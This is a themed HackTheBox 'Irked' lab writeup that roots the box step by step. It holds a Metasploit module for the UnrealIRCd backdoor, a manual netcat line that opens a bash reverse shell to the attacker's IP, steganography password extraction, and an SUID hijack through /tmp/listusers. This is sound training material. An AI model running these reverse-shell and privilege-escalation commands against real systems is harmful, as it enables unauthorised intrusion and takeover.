# HTB_Irked
My writeup for the Irked machine.


🎃 Irked HTB - Pumpkin Spice Exploitation Guide 🍂
Difficulty: 🎃 Easy
Tags: #IRC #Backdoor #Steganography #SUID #PrivEsc

🌽 Introduction
Welcome to the Pumpkin Spice HackTheBox "Irked" Writeup! This guide will take you through the exploitation of the Irked machine step-by-step, with a cozy fall-themed twist. Grab your PSL (Pumpkin Spice Latte) and let’s root this box!

🕵️ Recon - Pumpkin Scouting 🎃
Nmap Scan (Pumpkin Spice Ports)

```bash
nmap -sV -sC -p- --min-rate 1000 -T4 10.10.10.117 -oA irked_scan
```

![1 nmap](https://github.com/user-attachments/assets/8e5f4d33-a67d-432b-9cdf-95ea87407006)


Open Ports:

22 🎃 SSH

80 🎃 Apache Web Server (with a hidden pumpkin message)

![2 IRC](https://github.com/user-attachments/assets/ae5a15c3-8a56-43d3-b551-1f9f8c691633)


6697, 8067, 65534 🎃 Unreal IRC (the backdoor is hiding like a pumpkin in a patch!)


![3 IRS scan](https://github.com/user-attachments/assets/a2f64c0d-c009-4dee-8f33-60e47e939528)


🚪 Exploitation - Smashing the Pumpkin (IRC Backdoor)
Metasploit Approach (Pumpkin Spice Exploit)

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 65534
set payload cmd/unix/reverse
set LHOST tun0
set LPORT 4444
```

exploit
🎃 BOOM! You should now have a shell as ircd.

Manual Exploit (For the Pumpkin Purists)

```bash
echo 'AB; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' | nc 10.10.10.117 65534
```
🎃 Listen with Netcat:

```bash
nc -lvnp 4444
```

🏡 Lateral Movement - Finding the Hidden Pumpkin Seeds
Steganography Challenge (Pumpkin Spice Password)
Download the mysterious pumpkin image:

```bash
wget http://10.10.10.117/irked.jpg
```
Extract the secret pumpkin spice password:

```bash
steghide extract -sf irked.jpg -p "UPupDOWNdownLRlrBAbaSSss"
```


![4 steno pwd](https://github.com/user-attachments/assets/3d16e2d5-a772-4c21-acdb-d8e0976d897f)


🎃 Output: pass.txt → Kab6h+v+Abp2F:???

SSH into djmardov’s pumpkin patch:

```bash
ssh djmardov@10.10.10.117
```


![5 ssh pass](https://github.com/user-attachments/assets/f118712a-a8c1-4dc4-b4a4-72d3adff567f)




![6 user flag](https://github.com/user-attachments/assets/b9e69e6b-6dda-498d-862d-8e30198d1714)



🎃 Privilege Escalation - Carving the Root Pumpkin
SUID Binary - viewuser (The Pumpkin King)
Find suspicious SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

🎃 Weird file: /usr/bin/viewuser

Analyze the pumpkin binary:

```bash
ltrace /usr/bin/viewuser
```

🎃 It runs /tmp/listusers as root!

Exploit it (Pumpkin King takeover):

```bash
echo '/bin/sh' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
```

� You are now root!

🏆 Final Flag - The Golden Pumpkin

```bash
cat /root/root.txt
```

![7 root flag](https://github.com/user-attachments/assets/ca95b63b-0ba0-46e3-8451-6f2d561e9f20)



🎃 Congratulations! You’ve rooted Irked and claimed your pumpkin prize!

📜 Lessons Learned (Pumpkin Wisdom)
Always check uncommon ports (like 65534) for hidden pumpkins (services).

Steganography can hide pumpkin seeds (credentials).

SUID binaries are like pumpkin patches—some are rotten (exploitable).

👻 Happy Hacking & Happy Halloween! 🎃
